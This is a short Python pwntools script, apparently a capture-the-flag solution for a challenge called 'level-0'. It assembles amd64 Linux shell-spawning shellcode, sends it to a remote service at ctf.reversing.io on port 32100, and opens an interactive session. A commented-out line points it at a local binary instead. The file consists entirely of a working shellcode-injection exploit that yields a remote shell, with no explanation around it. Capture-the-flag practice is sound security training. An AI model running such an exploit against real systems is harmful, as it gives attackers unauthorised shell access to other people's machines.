
from pwn import *

payload = asm(shellcraft.amd64.sh(), arch = 'amd64', os = 'linux')

# endpoint = process("level-0")
endpoint = remote("ctf.reversing.io", 32100)

endpoint.send(payload)
endpoint.interactive()
